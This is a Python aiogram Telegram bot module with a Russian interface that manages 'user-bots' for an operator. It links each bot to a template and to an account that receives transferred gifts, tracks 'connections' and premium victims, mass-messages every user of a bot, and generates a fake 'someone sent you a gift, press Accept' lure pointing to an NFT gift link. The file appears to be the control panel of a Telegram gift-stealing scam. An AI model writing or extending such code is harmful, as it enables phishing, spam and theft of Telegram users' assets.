import asyncio
from aiogram import Router, F, types, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from models import ConnectedID, MainUser, Template, UserBot, UserBotClient
from user_webhook import start_user_bot
from main_menu import send_main_menu
from config import MANAGE_BOTS_PHOTO_URL, TEMPLATES_PHOTO_URL
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from asyncio import create_task, Semaphore, gather
from aiogram.exceptions import TelegramAPIError
from redis_client import redis_client as redis
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

router = Router()

# 👤 FSM для рассылки
class SpamState(StatesGroup):
    waiting_for_text = State()


class PreviewState(StatesGroup):
    waiting_for_gift_url = State()

# 👤 Главное меню управления ботами
def get_bots_menu_keyboard() -> list[list[InlineKeyboardButton]]:
    return [
        [
            InlineKeyboardButton(text="Добавить бота", callback_data="add_userbot"),
            InlineKeyboardButton(text="‹ Назад", callback_data="go_back_main")
        ]
    ]


# 📸 Отправка меню со списком ботов
async def send_bots_menu(
    target: types.Message | types.CallbackQuery,
    page: int = 0,
    telegram_id: int | None = None
):
    user_id = telegram_id if telegram_id is not None else target.from_user.id
    user, _ = await MainUser.get_or_create(telegram_id=user_id)
    bots = await UserBot.filter(owner=user)

    bots_per_page = 10
    paginated = bots[page * bots_per_page: (page + 1) * bots_per_page]

    bot_buttons = []
    for i in range(0, len(paginated), 2):
        row = [
            InlineKeyboardButton(
                text=f"@{b.username or 'Без имени'}",
                callback_data=f"bot:{b.id}"
            )
            for b in paginated[i:i + 2]
        ]
        bot_buttons.append(row)

    pagination_row = []
    if page > 0:
        pagination_row.append(
            InlineKeyboardButton(text="⬅️", callback_data=f"bots:{page - 1}")
        )
    if (page + 1) * bots_per_page < len(bots):
        pagination_row.append(
            InlineKeyboardButton(text="➡️", callback_data=f"bots:{page + 1}")
        )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Добавить бота", callback_data="add_userbot"),
            InlineKeyboardButton(text="‹ Назад", callback_data="go_back_main")
        ],
        *bot_buttons,
        pagination_row if pagination_row else []
    ])

    send_photo = (
        target.message.answer_photo
        if isinstance(target, types.CallbackQuery)
        else target.answer_photo
    )

    await send_photo(
        photo=MANAGE_BOTS_PHOTO_URL,
        caption="<b>🤖 Управление ботами:</b>",
        reply_markup=keyboard,
        parse_mode="HTML"  
    )

# 📦 Открытие меню ботов
@router.callback_query(F.data.startswith("bots"))
async def open_bots_menu(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    page = int(callback.data.split(":")[1]) if ":" in callback.data else 0
    await send_bots_menu(callback, page)
    await callback.answer()


# ➕ Запрос токена для добавления бота
@router.callback_query(F.data == "add_userbot")
async def ask_token(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    await callback.message.answer("<b>🔐 Введите токен бота:</b>", parse_mode="HTML")
    await callback.answer()

# 🔙 Назад в главное меню
@router.callback_query(F.data == "go_back_main")
async def go_back_main(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    await send_main_menu(callback.message)
    await callback.answer()


@router.message(F.text.regexp(r"^\d+:[\w-]{30,}$"))
async def handle_token(message: types.Message):
    token = message.text.strip()

    try:
        temp_bot = Bot(token=token)
        me = await temp_bot.get_me()
        username = me.username

        main_user, _ = await MainUser.get_or_create(telegram_id=message.from_user.id)

        # Получаем или создаём user-бота
        user_bot, created = await UserBot.get_or_create(
            owner=main_user,
            token=token
        )

        # Обновляем username даже если бот уже есть
        user_bot.username = username
        await user_bot.save()

        if not created:
            await message.answer("<b>❗ Этот бот уже был добавлен.</b>", parse_mode="HTML")
            return

        await start_user_bot(token)
        await message.answer("<b>✅ Бот добавлен.</b>", parse_mode="HTML")

        # Получаем доступные шаблоны
        templates = await Template.filter(owner=main_user)
        if not templates:
            # Удаляем бота и webhook
            try:
                await temp_bot.delete_webhook(drop_pending_updates=True)
            except:
                pass
            await user_bot.delete()

            await message.answer(
                "<b>⚠️ У вас нет шаблонов. Сначала создайте шаблон перед добавлением бота.</b>",
                parse_mode="HTML"
            )
            return

        # Отправляем выбор шаблона
        buttons = [
            [InlineKeyboardButton(
                text=tpl.name,
                callback_data=f"choose_template:{tpl.id}:{user_bot.id}"
            )] for tpl in templates
        ]
        markup = InlineKeyboardMarkup(inline_keyboard=buttons)

        await message.answer_photo(
            photo=TEMPLATES_PHOTO_URL,
            caption="<b>📦 Выберите шаблон, который будет использоваться этим ботом:</b>",
            reply_markup=markup,
            parse_mode="HTML"
        )

    except Exception as e:
        await message.answer(f"<b>❌ Ошибка:</b>\n<code>{e}</code>", parse_mode="HTML")

@router.callback_query(F.data.startswith("choose_template:"))
async def choose_template(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    parts = callback.data.split(":")
    if len(parts) != 3:
        await callback.message.answer("<b>❌ Неверные данные.</b>", parse_mode="HTML")
        return

    template_id = int(parts[1])
    user_bot_id = int(parts[2])

    bot = await UserBot.get_or_none(id=user_bot_id)
    if not bot:
        await callback.message.answer("<b>❌ Бот не найден.</b>", parse_mode="HTML")
        return

    user, _ = await MainUser.get_or_create(telegram_id=callback.from_user.id)

    ids = await ConnectedID.filter(owner=user).order_by("-added_at")

    if not ids:
        try:
            temp_bot = Bot(token=bot.token)
            await temp_bot.delete_webhook(drop_pending_updates=True)
        except:
            pass

        await bot.delete()

        await callback.message.answer(
            "<b>⚠️ Сначала добавьте аккаунт для передачи подарков в разделе \"Настройки\".</b>",
            parse_mode="HTML"
        )
        await send_bots_menu(callback.message, telegram_id=callback.from_user.id)
        return

    bot.template_id = template_id
    await bot.save()

    buttons = [
        [InlineKeyboardButton(
            text=str(conn.telegram_id),
            callback_data=f"set_forward:{conn.telegram_id}:{bot.id}"
        )] for conn in ids
    ]
    markup = InlineKeyboardMarkup(inline_keyboard=buttons)

    await callback.message.answer_photo(
        photo=TEMPLATES_PHOTO_URL,
        caption="<b>🔁 Выберите аккаунт для передачи подарков:</b>",
        reply_markup=markup,
        parse_mode="HTML"
    )

@router.callback_query(F.data.startswith("set_forward:"))
async def set_forward_id(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    parts = callback.data.split(":")
    if len(parts) != 3:
        await callback.message.answer("❌ Неверные данные.")
        return

    forward_id = int(parts[1])
    bot_id = int(parts[2])

    bot = await UserBot.get_or_none(id=bot_id)
    if not bot:
        await callback.message.answer("❌ Бот не найден.")
        return

    bot.forward_to_id = forward_id
    await bot.save()

    await callback.message.answer("<b>✅ Аккаунт для передачи привязан.</b>", parse_mode="HTML")
    await send_bots_menu(callback.message, telegram_id=callback.from_user.id)


async def send_bot_info(callback: types.CallbackQuery, bot_id: int):
    bot_data = await UserBot.get_or_none(id=bot_id).prefetch_related("owner", "template")

    if not bot_data:
        await callback.message.answer("<b>❌ Бот не найден.</b>", parse_mode="HTML")
        return

    # Получаем количество клиентов с премиумом
    premium_count = await UserBotClient.filter(bot=bot_data, is_premium=1).count()

    markup = InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="Обновить", callback_data=f"bot_refresh:{bot_id}")],
        [types.InlineKeyboardButton(text="Изменить шаблон", callback_data=f"change_template:{bot_id}")],
        [types.InlineKeyboardButton(text="Изменить передачу", callback_data=f"change_forward:{bot_id}")],
        [types.InlineKeyboardButton(text="Проспамить", callback_data=f"spam_bot:{bot_id}")],
        [types.InlineKeyboardButton(text="Создать превью", callback_data=f"create_preview:{bot_id}")],
        [types.InlineKeyboardButton(text="Удалить бота", callback_data=f"delete_bot_confirm:{bot_id}")],
        [types.InlineKeyboardButton(text="‹ Назад", callback_data="bots:0")]
    ])

    template_name = "не привязан"
    if bot_data.template_id:
        template = await Template.get_or_none(id=bot_data.template_id)
        if template:
            template_name = template.name

    caption = (
        f"<b>🤖 Бот:</b> <b>@{bot_data.username or 'без имени'}</b>\n"
        f"<b>🔐 Token:</b>\n<code>{bot_data.token}</code>\n\n"
        f"<blockquote>"
        f"📈 <b>Запуски:</b> <b>{bot_data.launches}</b>\n"
        f"🚀 <b>Запуски премиум:</b> <b>{premium_count}</b>\n"
        f"👥 <b>Подключения:</b> <b>{bot_data.connection_count}</b>"
        f"</blockquote>\n\n"
        f"<b>📦 Шаблон:</b> <b>{template_name}</b>\n"
        f"<b>🎁 Передаёт подарки на:</b> <code>{bot_data.forward_to_id or 'не настроено'}</code>"
    )

    await callback.message.answer_photo(
        photo=MANAGE_BOTS_PHOTO_URL,
        caption=caption,
        reply_markup=markup,
        parse_mode="HTML"
    )

@router.callback_query(F.data.startswith("change_forward:"))
async def change_forward(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])
    bot_data = await UserBot.get_or_none(id=bot_id).prefetch_related("owner")

    if not bot_data:
        await callback.message.answer("<b>❌ Бот не найден.</b>", parse_mode="HTML")
        return

    user = bot_data.owner
    connected_ids = await ConnectedID.filter(owner=user).order_by("-added_at")

    if not connected_ids:
        await callback.message.answer("<b>⚠️ У вас нет подключённых аккаунтов.</b>", parse_mode="HTML")
        return

    buttons = [
        [InlineKeyboardButton(
            text=str(conn.telegram_id),
            callback_data=f"apply_new_forward:{conn.telegram_id}:{bot_id}"
        )] for conn in connected_ids
    ]
    buttons.append([
        InlineKeyboardButton(text="‹ Назад", callback_data=f"bot:{bot_id}")
    ])

    markup = InlineKeyboardMarkup(inline_keyboard=buttons)

    await callback.message.answer_photo(
        photo=MANAGE_BOTS_PHOTO_URL,
        caption="<b>🎁 Выберите новый аккаунт для передачи подарков:</b>",
        reply_markup=markup,
        parse_mode="HTML"
    )

@router.callback_query(F.data.startswith("apply_new_forward:"))
async def apply_new_forward(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    parts = callback.data.split(":")
    if len(parts) != 3:
        await callback.message.answer("❌ Неверные данные.")
        return

    forward_id = int(parts[1])
    bot_id = int(parts[2])

    bot = await UserBot.get_or_none(id=bot_id)
    if not bot:
        await callback.message.answer("❌ Бот не найден.")
        return

    bot.forward_to_id = forward_id
    await bot.save()

    await callback.message.answer("<b>✅ Аккаунт для передачи обновлён.</b>", parse_mode="HTML")
    await send_bot_info(callback, bot_id)


@router.callback_query(F.data.startswith("delete_bot_confirm:"))
async def confirm_delete_bot(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])

    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Да", callback_data=f"delete_bot_yes:{bot_id}")],
        [InlineKeyboardButton(text="❌ Нет", callback_data=f"bot:{bot_id}")]
    ])

    await callback.message.answer_photo(
        photo=MANAGE_BOTS_PHOTO_URL,
        caption="⚠️ Вы точно хотите <b>удалить</b> этого бота?",
        reply_markup=markup,
        parse_mode="HTML"
    )

@router.callback_query(F.data.startswith("delete_bot_yes:"))
async def delete_bot(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])
    bot_data = await UserBot.get_or_none(id=bot_id)

    if not bot_data:
        await callback.message.answer("❌ Бот не найден.")
        return

    try:
        # Удаляем Webhook
        temp_bot = Bot(token=bot_data.token)
        await temp_bot.delete_webhook()
        await temp_bot.session.close()
    except Exception as e:
        await callback.message.answer(f"⚠️ Не удалось удалить Webhook:\n<code>{e}</code>")

    # Удаляем клиентов этого бота
    await UserBotClient.filter(bot=bot_data).delete()

    # Удаляем самого бота
    await bot_data.delete()

    await callback.message.answer("<b>✅ Бот успешно удалён.</b>", parse_mode="HTML")
    await send_bots_menu(callback.message)

@router.callback_query(F.data.startswith("change_template:"))
async def change_template(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])
    bot_data = await UserBot.get_or_none(id=bot_id).prefetch_related("owner")

    if not bot_data:
        await callback.message.answer("❌ Бот не найден.")
        return

    templates = await Template.filter(owner=bot_data.owner)

    if not templates:
        await callback.message.answer("❗ У вас нет шаблонов.")
        return

    buttons = [
        [InlineKeyboardButton(
            text=tpl.name,
            callback_data=f"apply_new_template:{tpl.id}:{bot_id}"
        )] for tpl in templates
    ]

    markup = InlineKeyboardMarkup(inline_keyboard=buttons)

    await callback.message.answer_photo(
        photo=TEMPLATES_PHOTO_URL,
        caption="<b>📦 Выберите новый шаблон для этого бота:</b>",
        reply_markup=markup,
        parse_mode="HTML"
    )

@router.callback_query(F.data.startswith("apply_new_template:"))
async def apply_new_template(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    parts = callback.data.split(":")
    if len(parts) != 3:
        await callback.message.answer("❌ Неверные данные.")
        return

    template_id = int(parts[1])
    bot_id = int(parts[2])

    bot = await UserBot.get_or_none(id=bot_id)
    if not bot:
        await callback.message.answer("❌ Бот не найден.")
        return

    # Сохраняем новый шаблон
    bot.template_id = template_id
    await bot.save()

    await callback.message.answer("<b>✅ Шаблон успешно обновлён.</b>", parse_mode="HTML")
    await send_bot_info(callback, bot_id)



@router.callback_query(F.data.startswith("bot:"))
async def handle_bot_details(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])
    await send_bot_info(callback, bot_id)
    await callback.answer()


@router.callback_query(F.data.startswith("spam_bot:"))
async def ask_spam_text(callback: types.CallbackQuery, state: FSMContext):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])
    await state.update_data(bot_id=bot_id, chat_id=callback.message.chat.id)

    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="‹ Назад", callback_data=f"bot:{bot_id}")]
    ])

    await callback.message.answer_photo(
        photo=MANAGE_BOTS_PHOTO_URL,
        caption="✍️ <b>Пришлите текст, который будет отправлен всем пользователям этого user-бота.</b>",
        reply_markup=markup,
        parse_mode="HTML"
    )

    await state.set_state(SpamState.waiting_for_text)

@router.message(SpamState.waiting_for_text)
async def handle_spam_text(message: types.Message, state: FSMContext):
    data = await state.get_data()
    bot_id = data.get("bot_id")
    spam_text = f"<b>{message.text}</b>"

    await message.answer("⏳ <b>Рассылка запущена в фоне.</b>", parse_mode="HTML")

    create_task(run_spam(message, bot_id, spam_text))

    await state.clear()

async def run_spam(message: types.Message, bot_id: int, text: str):
    from redis_client import redis_client as redis

    bot_data = await UserBot.get_or_none(id=bot_id)
    if not bot_data:
        await message.answer("❌ Бот не найден.")
        return

    user_bot = Bot(token=bot_data.token)
    users = await UserBotClient.filter(bot=bot_data)
    total = len(users)

    success_key = f"spam:{bot_id}:success"
    failed_key = f"spam:{bot_id}:failed"
    await redis.set(success_key, 0)
    await redis.set(failed_key, 0)

    semaphore = Semaphore(5)

    async def send_to_user(user):
        async with semaphore:
            try:
                await user_bot.send_message(chat_id=user.telegram_id, text=text, parse_mode="HTML")
                await redis.incr(success_key)
            except TelegramAPIError:
                await redis.incr(failed_key)
            await asyncio.sleep(0.3)

    await gather(*(send_to_user(user) for user in users))

    success = int(await redis.get(success_key) or 0)
    failed = int(await redis.get(failed_key) or 0)

    final_stats = (
        f"<b>📊 Рассылка завершена:</b>\n"
        f"<b>👥 Всего пользователей:</b> <b>{total}</b>\n"
        f"<b>✅ Успешно:</b> <b>{success}</b>\n"
        f"<b>❌ Неудачно:</b> <b>{failed}</b>"
    )

    try:
        await message.answer(final_stats, parse_mode="HTML")
    except Exception as e:
        print(f"[SPAM STATS ERROR] {e}")

    await redis.delete(success_key)
    await redis.delete(failed_key)

@router.callback_query(F.data.startswith("create_preview:"))
async def handle_create_preview(callback: types.CallbackQuery, state: FSMContext):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])
    await state.update_data(bot_id=bot_id)

    await callback.message.answer("<b>🔗 Пришлите ссылку на подарок (https://t.me/nft/...)</b>", parse_mode="HTML")
    await state.set_state(PreviewState.waiting_for_gift_url)

@router.message(PreviewState.waiting_for_gift_url)
async def handle_gift_url(message: types.Message, state: FSMContext):
    url = message.text.strip()
    if not url.startswith("https://t.me/nft/"):
        await message.answer("<b>❌ Ссылка должна начинаться с https://t.me/nft/</b>", parse_mode="HTML")
        return

    data = await state.get_data()
    bot_id = data.get("bot_id")

    bot_data = await UserBot.get_or_none(id=bot_id).prefetch_related("owner")
    if not bot_data or not bot_data.token or not bot_data.username or not bot_data.owner:
        await message.answer("❌ Бот не найден или неполные данные.", parse_mode="HTML")
        await state.clear()
        return

    gift_code = url.rsplit("/", 1)[-1]
    gift_name = gift_code.replace("-", " #")

    message_text = (
        f"🎁 <b><a href='{url}'>{gift_name}</a></b>\n\n"
        f"<i>Кто-то решил вас порадовать — получить свой подарок нажав \"Принять\"</i>"
    )

    markup = InlineKeyboardMarkup(inline_keyboard=[[ 
        InlineKeyboardButton(
            text="🎁 Принять",
            url=f"https://t.me/{bot_data.username}?start"
        )
    ]])

    try:
        # ✅ Инициализация user-бота с правильным default=parse_mode
        user_bot = Bot(
            token=bot_data.token,
            default=DefaultBotProperties(parse_mode=ParseMode.HTML)
        )
        await user_bot.send_message(
            chat_id=bot_data.owner.telegram_id,
            text=message_text,
            reply_markup=markup,
            disable_web_page_preview=False
        )
    except Exception as e:
        await message.answer(
            f"<b>❌ Ошибка отправки через user-бота:</b>\n<code>{e}</code>",
            parse_mode="HTML"
        )

    await state.clear()

@router.callback_query(F.data.startswith("bot_refresh:"))
async def refresh_bot_info(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])
    await send_bot_info(callback, bot_id)
    await callback.answer()